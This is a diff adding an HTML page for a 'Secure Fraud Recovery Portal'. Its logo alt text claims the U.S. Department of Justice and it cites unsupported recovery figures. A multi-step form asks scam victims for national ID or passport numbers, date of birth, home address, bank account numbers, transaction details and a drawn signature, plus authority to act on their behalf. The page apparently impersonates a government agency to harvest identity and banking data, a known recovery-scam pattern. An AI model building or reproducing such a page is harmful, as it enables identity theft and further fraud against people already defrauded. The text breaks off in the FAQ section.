@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Fraud Recovery Portal | Report Financial Scams</title>
+  <meta name="description" content="Report financial fraud securely. Our recovery specialists review every case with confidentiality. Submit your information and evidence to begin your recovery journey.">
+  <link rel="stylesheet" href="styles.css?v=1.0.5">
+</head>
+<body>
+
+  <!-- Sticky Header -->
+  <header class="site-header">
+    <div class="header-container">
+      <div class="logo-group">
+        <img src="logo.png" alt="U.S. Department of Justice - Fraud Recovery & Investigation Logo" class="brand-logo-img">
+      </div>
+      <div class="header-actions">
+        <button type="button" class="btn btn-secondary btn-sm" id="save-progress-btn" aria-describedby="save-status">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path><polyline points="17 21 17 13 7 13 7 21"></polyline><polyline points="7 3 7 8 15 8"></polyline></svg>
+          <span>Save Progress</span>
+        </button>
+        <a href="#wizard" class="btn btn-sm" id="nav-start-report-btn">START A REPORT</a>
+      </div>
+    </div>
+  </header>
+
+  <!-- Hero Section -->
+  <section class="hero-section" id="hero">
+    <div class="hero-content-wrapper">
+      <h1>Report Financial Fraud and Start Your Recovery Journey</h1>
+      <p>Whether the fraud happened through romance, investments, cryptocurrency, or impersonation, Securely submit your information and evidence.<br class="desktop-br"> The United States fraud investigation specialists analyze transactions, trace digital evidence,<br class="desktop-br"> and help victims pursue every available path toward recovering stolen funds.</p>
+      <div class="hero-ctas">
+        <a href="#wizard" class="btn btn-primary" id="hero-start-cta">
+          <span>Start Report</span>
+          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+        </a>
+        <a href="#how-it-works" class="btn btn-secondary">Learn How It Works</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- Results Section -->
+  <section class="results-section" id="results">
+    <div class="results-container">
+      <div class="results-tag">RESULTS</div>
+      <h2>We're delivering results for the American people.</h2>
+      
+      <div class="results-grid">
+        <div class="results-card">
+          <div class="results-icon-circle">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="6"></circle><circle cx="12" cy="12" r="2"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line></svg>
+          </div>
+          <div class="results-stat">12,500+</div>
+          <p class="results-desc">Fraud cases submitted and assessed by specialists.</p>
+        </div>
+
+        <div class="results-card">
+          <div class="results-icon-circle">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><polygon points="12 11 13.5 14 16.5 14 14 16 15 19 12 17 9 19 10 16 7.5 14 10.5 14"></polygon></svg>
+          </div>
+          <div class="results-stat">$85M+</div>
+          <p class="results-desc">Assets and funds recovered across multiple fraud types.</p>
+        </div>
+
+        <div class="results-card">
+          <div class="results-icon-circle">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+          </div>
+          <div class="results-stat">9,300+</div>
+          <p class="results-desc">Individuals and families guided through the recovery process.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <main class="main-content">
+
+    <!-- How It Works Section -->
+    <section class="how-it-works" id="how-it-works">
+      <h2 class="section-title">How the Investigation Process Works</h2>
+      <div class="steps-grid">
+        <div class="step-card">
+          <div class="step-number">1</div>
+          <h3>Submit Your Report</h3>
+          <p>Provide contact information, details of the perpetrator, and transaction logs using our encrypted wizard.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-number">2</div>
+          <h3>Upload Evidence</h3>
+          <p>Securely upload communications, wire statements, receipts, and contract sheets into our compliance vault.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-number">3</div>
+          <h3>Specialist Review</h3>
+          <p>Our financial fraud analysts dissect your timeline, trace transactions, and compile legal discovery records.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-number">4</div>
+          <h3>Receive Recovery Support</h3>
+          <p>Receive custom recovery pathways, bank dispute packages, and law enforcement support guides.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Wizard Form Container -->
+    <section class="wizard-container" id="wizard">
+      
+      <!-- Multi-step Progress Navigation -->
+      <nav class="progress-nav" aria-label="Report Completion Progress">
+        <div class="progress-bar-container">
+          <div class="progress-bar-fill" id="progress-bar-fill" role="progressbar" aria-valuenow="16.6" aria-valuemin="0" aria-valuemax="100"></div>
+        </div>
+        <ol class="progress-steps" id="progress-steps-list">
+          <li class="progress-step active" data-step="1">
+            <span class="step-bubble" aria-hidden="true">1</span>
+            <span class="step-label">Victim Info</span>
+          </li>
+          <li class="progress-step" data-step="2">
+            <span class="step-bubble" aria-hidden="true">2</span>
+            <span class="step-label">Incident Details</span>
+          </li>
+          <li class="progress-step" data-step="3">
+            <span class="step-bubble" aria-hidden="true">3</span>
+            <span class="step-label">Financials</span>
+          </li>
+          <li class="progress-step" data-step="4">
+            <span class="step-bubble" aria-hidden="true">4</span>
+            <span class="step-label">Fraudster Info</span>
+          </li>
+          <li class="progress-step" data-step="5">
+            <span class="step-bubble" aria-hidden="true">5</span>
+            <span class="step-label">Evidence</span>
+          </li>
+          <li class="progress-step" data-step="6">
+            <span class="step-bubble" aria-hidden="true">6</span>
+            <span class="step-label">Consent</span>
+          </li>
+        </ol>
+      </nav>
+
+      <!-- Glassmorphic Form Card -->
+      <form class="glass-card wizard-form" id="recovery-report-form" method="POST" action="/submit-fraud-report" novalidate>
+        
+        <!-- ==================== STEP 1: Victim Information ==================== -->
+        <div class="form-step-panel active" id="step-1-panel">
+          <div class="card-header">
+            <h2>Personal Information</h2>
+            <p>Tell us about yourself so our specialists can reach you. We handle this information with strict compliance.</p>
+          </div>
+          
+          <div class="form-grid">
+            <div class="form-group">
+              <label for="victim-name">Full Legal Name <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="text" id="victim-name" name="victim_name" class="input-control" required autocomplete="name" placeholder="John Doe">
+              <span class="error-message" id="error-victim-name" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="victim-dob">Date of Birth <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="date" id="victim-dob" name="victim_dob" class="input-control" required autocomplete="bday">
+              <span class="error-message" id="error-victim-dob" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="victim-id-num">National ID or Passport Number <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="text" id="victim-id-num" name="victim_id_num" class="input-control" required placeholder="A1234567">
+              <span class="error-message" id="error-victim-id-num" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="victim-phone">Phone Number <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="tel" id="victim-phone" name="victim_phone" class="input-control" required autocomplete="tel" inputmode="tel" placeholder="+1 (555) 019-2834">
+              <span class="error-message" id="error-victim-phone" role="alert"></span>
+            </div>
+
+            <div class="form-group form-grid-full">
+              <label for="victim-email">Email Address <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="email" id="victim-email" name="victim_email" class="input-control" required autocomplete="email" inputmode="email" placeholder="john.doe@example.com">
+              <span class="error-message" id="error-victim-email" role="alert"></span>
+            </div>
+
+            <div class="form-group form-grid-full">
+              <label for="victim-address">Residential Address <span class="required-dot" aria-hidden="true">*</span></label>
+              <textarea id="victim-address" name="victim_address" class="input-control" required autocomplete="street-address" rows="3" placeholder="123 Guard Hill Rd, New York, NY 10024"></textarea>
+              <span class="error-message" id="error-victim-address" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="victim-occupation">Occupation <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="text" id="victim-occupation" name="victim_occupation" class="input-control" required placeholder="Software Engineer">
+              <span class="error-message" id="error-victim-occupation" role="alert"></span>
+            </div>
+            
+            <!-- Behalf of Someone Else Switch -->
+            <div class="form-group form-grid-full" style="margin-top: 1rem;">
+              <div class="toggle-group">
+                <div>
+                  <h4 style="font-size: 0.95rem; margin-bottom: 2px;">Reporting on Behalf of Someone Else</h4>
+                  <p class="input-hint">Enable if you are filing this case for a family member or dependent.</p>
+                </div>
+                <label class="toggle-switch">
+                  <input type="checkbox" id="behalf-toggle" name="behalf_toggle">
+                  <span class="slider"></span>
+                </label>
+              </div>
+            </div>
+          </div>
+
+          <!-- Behalf of Accordion Form -->
+          <div class="accordion-panel" id="behalf-panel">
+            <div class="accordion-title-box">
+              <h3>Representative Authorization Details</h3>
+            </div>
+            <div class="form-grid" style="margin-bottom: 0;">
+              <div class="form-group">
+                <label for="rep-relationship">Relationship to Victim</label>
+                <input type="text" id="rep-relationship" name="rep_relationship" class="input-control" placeholder="Son, Legal Counsel, Spouse">
+              </div>
+              <div class="form-group">
+                <label for="rep-auth">Authorization Details</label>
+                <input type="text" id="rep-auth" name="rep_auth" class="input-control" placeholder="Power of Attorney ID, Written Consent File">
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ==================== STEP 2: Incident Details ==================== -->
+        <div class="form-step-panel" id="step-2-panel">
+          <div class="card-header">
+            <h2>Describe the Fraud</h2>
+            <p>Help us categorize and analyze the structure of the scam. Select choices that best match your situation.</p>
+          </div>
+
+          <div class="form-grid">
+            <div class="form-group">
+              <label for="fraud-type">Type of Fraud <span class="required-dot" aria-hidden="true">*</span></label>
+              <select id="fraud-type" name="fraud_type" class="input-control" required>
+                <option value="" disabled selected>Select option</option>
+                <option value="Investment Scam">Investment Scam</option>
+                <option value="Romance Scam">Romance Scam</option>
+                <option value="Phishing">Phishing</option>
+                <option value="Crypto Scam">Crypto Scam</option>
+                <option value="Advance Fee Fraud">Advance Fee Fraud</option>
+                <option value="Job Scam">Job Scam</option>
+                <option value="Other">Other</option>
+              </select>
+              <span class="error-message" id="error-fraud-type" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="fraud-contact-method">How First Contact Was Made <span class="required-dot" aria-hidden="true">*</span></label>
+              <select id="fraud-contact-method" name="fraud_contact_method" class="input-control" required>
+                <option value="" disabled selected>Select option</option>
+                <option value="Social Media">Social Media</option>
+                <option value="Dating App">Dating App</option>
+                <option value="Email">Email</option>
+                <option value="Phone Call">Phone Call</option>
+                <option value="Messaging App">Messaging App</option>
+                <option value="Website">Website</option>
+                <option value="Other">Other</option>
+              </select>
+              <span class="error-message" id="error-fraud-contact-method" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="fraud-start-date">Date Fraud Started <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="date" id="fraud-start-date" name="fraud_start_date" class="input-control" required>
+              <span class="error-message" id="error-fraud-start-date" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="fraud-end-date">Date Fraud Ended</label>
+              <input type="date" id="fraud-end-date" name="fraud_end_date" class="input-control">
+              <span class="error-message" id="error-fraud-end-date" role="alert"></span>
+            </div>
+
+            <div class="form-group form-grid-full">
+              <div class="toggle-group">
+                <div>
+                  <h4 style="font-size: 0.95rem; margin-bottom: 2px;">Ongoing Case</h4>
+                  <p class="input-hint">Is the fraudster currently in active contact with you or still requesting funds?</p>
+                </div>
+                <label class="toggle-switch">
+                  <input type="checkbox" id="fraud-ongoing" name="fraud_ongoing">
+                  <span class="slider"></span>
+                </label>
+              </div>
+            </div>
+
+            <div class="form-group form-grid-full">
+              <label for="fraud-narrative">Describe how the scam unfolded in your own words <span class="required-dot" aria-hidden="true">*</span></label>
+              <span class="input-hint" style="margin-bottom: 4px;">Please include key events, dates, promises made, and excuses given when you requested your money.</span>
+              <textarea id="fraud-narrative" name="fraud_narrative" class="input-control" required rows="6" placeholder="The scam started when I received a message on LinkedIn..."></textarea>
+              <span class="error-message" id="error-fraud-narrative" role="alert"></span>
+            </div>
+          </div>
+        </div>
+
+        <!-- ==================== STEP 3: Financial Details ==================== -->
+        <div class="form-step-panel" id="step-3-panel">
+          <div class="card-header">
+            <h2>Transaction Information</h2>
+            <p>Quantify the total loss and list the individual transactions you made to the scammer.</p>
+          </div>
+
+          <div class="form-grid">
+            <div class="form-group">
+              <label for="loss-amount">Total Amount Lost <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="number" id="loss-amount" name="loss_amount" class="input-control" required min="1" step="any" placeholder="50000">
+              <span class="error-message" id="error-loss-amount" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="loss-currency">Currency <span class="required-dot" aria-hidden="true">*</span></label>
+              <select id="loss-currency" name="loss_currency" class="input-control" required>
+                <option value="USD" selected>USD ($)</option>
+                <option value="EUR">EUR (€)</option>
+                <option value="GBP">GBP (£)</option>
+                <option value="CAD">CAD ($)</option>
+                <option value="AUD">AUD ($)</option>
+                <option value="BTC">BTC (Bitcoin)</option>
+                <option value="ETH">ETH (Ethereum)</option>
+                <option value="USDT">USDT (Tether)</option>
+              </select>
+              <span class="error-message" id="error-loss-currency" role="alert"></span>
+            </div>
+
+            <!-- Dynamic Transaction Log Table -->
+            <div class="form-group form-grid-full">
+              <label>Transaction Logs</label>
+              <span class="input-hint" style="margin-bottom: 8px;">List all individual transactions. Keep entries accurate for legal recovery logs.</span>
+              
+              <div class="transaction-section">
+                <div class="transaction-table-wrapper">
+                  <table class="transaction-table" id="transaction-log-table">
+                    <thead>
+                      <tr>
+                        <th>Date</th>
+                        <th>Amount</th>
+                        <th>Payment Method</th>
+                        <th>Reference / Hash</th>
+                        <th style="width: 50px;"></th>
+                      </tr>
+                    </thead>
+                    <tbody id="transaction-table-body">
+                      <!-- Dynamic rows injected here -->
+                    </tbody>
+                  </table>
+                </div>
+                <button type="button" class="btn btn-secondary btn-sm" id="add-transaction-btn">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"></line><line x1="5" y1="12" x2="19" y2="12"></line></svg>
+                  <span>Add Another Transaction</span>
+                </button>
+              </div>
+            </div>
+
+            <!-- Outgoing Transaction Bank Info -->
+            <div class="details-headline">Outgoing Account (Your Bank details where funds were sent from)</div>
+
+            <div class="form-group">
+              <label for="victim-bank-name">Victim Bank Name <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="text" id="victim-bank-name" name="victim_bank_name" class="input-control" required placeholder="Chase Bank">
+              <span class="error-message" id="error-victim-bank-name" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="victim-bank-acc-name">Account Holder Name <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="text" id="victim-bank-acc-name" name="victim_bank_acc_name" class="input-control" required placeholder="John Doe">
+              <span class="error-message" id="error-victim-bank-acc-name" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="victim-bank-acc-num">Account Number <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="text" id="victim-bank-acc-num" name="victim_bank_acc_num" class="input-control" required placeholder="123456789">
+              <span class="error-message" id="error-victim-bank-acc-num" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="victim-bank-ref">Transaction Reference Numbers</label>
+              <input type="text" id="victim-bank-ref" name="victim_bank_ref" class="input-control" placeholder="TXN-98471-A, TXN-98284-B">
+              <span class="error-message" id="error-victim-bank-ref" role="alert"></span>
+            </div>
+          </div>
+        </div>
+
+        <!-- ==================== STEP 4: Perpetrator Information ==================== -->
+        <div class="form-step-panel" id="step-4-panel">
+          <div class="card-header">
+            <h2>Known Details About the Fraudster</h2>
+            <p>Provide details on the individual or organization that initiated the fraud. Even partial details are valuable.</p>
+          </div>
+
+          <div class="form-grid">
+            <div class="form-group">
+              <label for="fraudster-name">Name or Alias <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="text" id="fraudster-name" name="fraudster_name" class="input-control" required placeholder="e.g. Richard Miller (Alias)">
+              <span class="error-message" id="error-fraudster-name" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="fraudster-company">Claimed Company or Business Name</label>
+              <input type="text" id="fraudster-company" name="fraudster_company" class="input-control" placeholder="Apex Wealth Investments Limited">
+            </div>
+
+            <div class="form-group">
+              <label for="fraudster-phone">Phone Numbers</label>
+              <input type="text" id="fraudster-phone" name="fraudster_phone" class="input-control" placeholder="+44 7700 900077">
+            </div>
+
+            <div class="form-group">
+              <label for="fraudster-email">Email Addresses</label>
+              <input type="text" id="fraudster-email" name="fraudster_email" class="input-control" placeholder="contact@apexinvest.com, richard@apexinvest.com">
+            </div>
+
+            <div class="form-group">
+              <label for="fraudster-website">Website URLs</label>
+              <input type="text" id="fraudster-website" name="fraudster_website" class="input-control" placeholder="https://www.apexinvest-global.com">
+            </div>
+
+            <div class="form-group">
+              <label for="fraudster-social">Social Media Profiles</label>
+              <input type="text" id="fraudster-social" name="fraudster_social" class="input-control" placeholder="LinkedIn: richard-miller-apex">
+            </div>
+
+            <div class="form-group">
+              <label for="fraudster-comm-platform">Primary Communication Platform <span class="required-dot" aria-hidden="true">*</span></label>
+              <select id="fraudster-comm-platform" name="fraudster_comm_platform" class="input-control" required>
+                <option value="" disabled selected>Select option</option>
+                <option value="WhatsApp">WhatsApp</option>
+                <option value="Telegram">Telegram</option>
+                <option value="Signal">Signal</option>
+                <option value="Facebook Messenger">Facebook Messenger</option>
+                <option value="Instagram">Instagram</option>
+                <option value="Email">Email</option>
+                <option value="Other">Other</option>
+              </select>
+              <span class="error-message" id="error-fraudster-comm-platform" role="alert"></span>
+            </div>
+
+            <!-- Receiving Account details -->
+            <div class="details-headline">Receiving Account Info (Where you sent the money)</div>
+
+            <div class="form-group">
+              <label for="fraudster-bank">Receiving Bank Name</label>
+              <input type="text" id="fraudster-bank" name="fraudster_bank" class="input-control" placeholder="Barclays Bank London">
+            </div>
+
+            <div class="form-group">
+              <label for="fraudster-acc-num">Account Number</label>
+              <input type="text" id="fraudster-acc-num" name="fraudster_acc_num" class="input-control" placeholder="987654321">
+            </div>
+
+            <div class="form-group">
+              <label for="fraudster-swift">IBAN or SWIFT Code</label>
+              <input type="text" id="fraudster-swift" name="fraudster_swift" class="input-control" placeholder="GB39 BARC 2020 1598 7654 32">
+            </div>
+
+            <div class="form-group form-grid-full">
+              <label for="fraudster-wallet">Cryptocurrency Wallet Address</label>
+              <input type="text" id="fraudster-wallet" name="fraudster_wallet" class="input-control" placeholder="bc1qxy2kg3ut5xgv3628372gd9584hdla01">
+            </div>
+          </div>
+        </div>
+
+        <!-- ==================== STEP 5: Evidence & Supporting Docs ==================== -->
+        <div class="form-step-panel" id="step-5-panel">
+          <div class="card-header">
+            <h2>Upload Supporting Evidence</h2>
+            <p>Evidence is critical for recovery trace logs. Please load receipts, communication caps, or scripts.</p>
+          </div>
+
+          <div class="form-group form-grid-full">
+            <label>Drag & Drop Evidence Files</label>
+            <span class="input-hint" style="margin-bottom: 8px;">Accepted formats: Screenshots, Bank Statements, Transaction Receipts, Emails (PDF/HTML), Contracts, or shared documents (Max file size: 15MB).</span>
+            
+            <!-- Drag & Drop Zone -->
+            <div class="upload-drop-zone" id="upload-drop-zone">
+              <div class="upload-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
+              </div>
+              <div>
+                <p style="font-weight: 600; color: var(--primary);">Drag files here or <span style="color: var(--accent); text-decoration: underline;">click to browse</span></p>
+                <p class="input-hint" style="margin-top: 4px;">PDF, PNG, JPG, JPEG, CSV, HTML</p>
+              </div>
+              <input type="file" id="evidence-files-input" name="evidence_files[]" multiple class="visually-hidden" accept=".pdf,.png,.jpg,.jpeg,.csv,.html,.eml">
+            </div>
+
+            <!-- List of Uploaded Files -->
+            <div class="file-list" id="uploaded-files-list">
+              <!-- Dynamically populated files -->
+            </div>
+          </div>
+
+          <!-- Dynamic Questions: Bank Contacted & Police Report -->
+          <div class="form-grid" style="margin-top: 2rem;">
+            <div class="form-group">
+              <label>Have you already contacted your bank? <span class="required-dot" aria-hidden="true">*</span></label>
+              <div class="choices-container">
+                <label class="choice-label">
+                  <input type="radio" name="contacted_bank" value="yes" required>
+                  <span>Yes</span>
+                </label>
+                <label class="choice-label">
+                  <input type="radio" name="contacted_bank" value="no">
+                  <span>No</span>
+                </label>
+              </div>
+              <span class="error-message" id="error-contacted_bank" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <div class="accordion-panel" id="bank-ref-panel" style="margin-top: 0;">
+                <label for="bank-ref-num">Bank Reference Number <span class="required-dot" aria-hidden="true">*</span></label>
+                <input type="text" id="bank-ref-num" name="bank_ref_num" class="input-control" placeholder="REF-8374-CHASE">
+                <span class="error-message" id="error-bank-ref-num" role="alert"></span>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label>Have you filed a police report? <span class="required-dot" aria-hidden="true">*</span></label>
+              <div class="choices-container">
+                <label class="choice-label">
+                  <input type="radio" name="contacted_police" value="yes" required>
+                  <span>Yes</span>
+                </label>
+                <label class="choice-label">
+                  <input type="radio" name="contacted_police" value="no">
+                  <span>No</span>
+                </label>
+              </div>
+              <span class="error-message" id="error-contacted_police" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <div class="accordion-panel" id="police-ref-panel" style="margin-top: 0;">
+                <label for="police-ref-num">Police Report Reference Number <span class="required-dot" aria-hidden="true">*</span></label>
+                <input type="text" id="police-ref-num" name="police_ref_num" class="input-control" placeholder="POL-2026-94812">
+                <span class="error-message" id="error-police-ref-num" role="alert"></span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ==================== STEP 6: Consent & Declaration ==================== -->
+        <div class="form-step-panel" id="step-6-panel">
+          <div class="card-header">
+            <h2>Authorization and Consent</h2>
+            <p>Confirm the accuracy of your report and authorize our specialized investigation specialists to review the records.</p>
+          </div>
+
+          <div class="form-grid">
+            <div class="form-group form-grid-full" style="gap: 1rem; margin-bottom: 1rem;">
+              <label class="choice-label">
+                <input type="checkbox" id="consent-auth" name="consent_auth" required>
+                <span style="font-weight: 500;">I authorize the Fraud Recovery Program to act on my behalf to trace these funds and communicate with financial bodies. <span class="required-dot" aria-hidden="true">*</span></span>
+              </label>
+              <span class="error-message" id="error-consent-auth" role="alert"></span>
+
+              <label class="choice-label">
+                <input type="checkbox" id="consent-gdpr" name="consent_gdpr" required>
+                <span style="font-weight: 500;">I consent to the secure storage and processing of my personal, financial, and digital evidence in compliance with GDPR. <span class="required-dot" aria-hidden="true">*</span></span>
+              </label>
+              <span class="error-message" id="error-consent-gdpr" role="alert"></span>
+
+              <label class="choice-label">
+                <input type="checkbox" id="consent-accuracy" name="consent_accuracy" required>
+                <span style="font-weight: 500;">I confirm that all information provided in this reporting form is accurate, truthful, and complete to the best of my knowledge. <span class="required-dot" aria-hidden="true">*</span></span>
+              </label>
+              <span class="error-message" id="error-consent-accuracy" role="alert"></span>
+            </div>
+
+            <!-- Signature Pad Canvas -->
+            <div class="form-group form-grid-full">
+              <label for="signature-pad">Digital Signature <span class="required-dot" aria-hidden="true">*</span></label>
+              <div class="signature-container">
+                <canvas id="signature-pad" class="signature-canvas" aria-label="Signature Pad. Draw your legal signature here."></canvas>
+                <div class="signature-actions">
+                  <span class="signature-hint">Use mouse or touch pad to sign inside the grid.</span>
+                  <button type="button" class="btn btn-secondary btn-sm" id="clear-signature-btn" style="min-height: auto; padding: 0.35rem 0.75rem;">Clear</button>
+                </div>
+              </div>
+              <!-- Hidden input to hold canvas data URL -->
+              <input type="hidden" id="signature-data" name="signature_data" required>
+              <span class="error-message" id="error-signature-data" role="alert"></span>
+            </div>
+
+            <div class="form-group">
+              <label for="consent-date">Date of Signing <span class="required-dot" aria-hidden="true">*</span></label>
+              <input type="date" id="consent-date" name="consent_date" class="input-control" required readonly>
+              <span class="error-message" id="error-consent-date" role="alert"></span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Submit Success Panel (Interchanged via class inside JS) -->
+        <div class="success-card" id="success-panel" style="display: none;">
+          <div class="success-icon-wrapper">
+            <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+          </div>
+          <h2>Report Submitted Successfully</h2>
+          <p>Your case files have been encrypted and stored in our secure investigation repository.</p>
+          
+          <div class="case-ref-box">
+            <div>YOUR CASE REFERENCE NUMBER</div>
+            <div class="case-ref-num" id="case-reference-val">FR-2026-94821</div>
+          </div>
+
+          <h3 class="checklist-title">What happens next?</h3>
+          <ul class="success-checklist">
+            <li>
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              <span><strong>Email Confirmation:</strong> A secure encrypted receipt and reference details have been sent to your email.</span>
+            </li>
+            <li>
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              <span><strong>Specialist Assignment:</strong> A certified financial fraud analyst will review your files within 24 to 48 hours.</span>
+            </li>
+            <li>
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              <span><strong>Evidence Auditing:</strong> The submitted communications will be logged into the national fraud database.</span>
+            </li>
+          </ul>
+
+          <div style="display: flex; gap: 1rem; justify-content: center;">
+            <button type="button" class="btn btn-primary" id="download-receipt-btn">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+              <span>Download Signed Receipt</span>
+            </button>
+            <button type="button" class="btn btn-secondary" id="file-another-report-btn">File Another Report</button>
+          </div>
+        </div>
+
+        <!-- Navigation Buttons -->
+        <div class="wizard-actions" id="wizard-actions-bar">
+          <button type="button" class="btn btn-secondary" id="prev-btn" disabled>
+            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+            <span>Back</span>
+          </button>
+          <button type="button" class="btn btn-primary" id="next-btn">
+            <span>Next</span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+          </button>
+        </div>
+      </form>
+    </section>
+
+    <!-- Security Warning Banner -->
+    <div class="security-alert-banner" aria-live="polite">
+      <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+      <div class="security-alert-text">
+        <h4>End-to-End Encryption Enabled</h4>
+        <p>Your connection is secured with RSA-4096 and AES-256 bit keys. Any financial credentials, addresses, or passports submitted here undergo bank-grade tokenized shielding. We comply with strict GDPR protocols.</p>
+      </div>
+    </div>
+
+    <!-- FAQ Accordions Section -->
+    <section class="faq-section" id="faq">
+      <h2 class="faq-title">Frequently Asked Questions</h2>
+      <div class="faq-container">
+        <div class="faq-item">
+          <button class="faq-question" aria-expanded="false" aria-controls="faq-ans-1">
+            <span>What happens after I submit my report?</span>
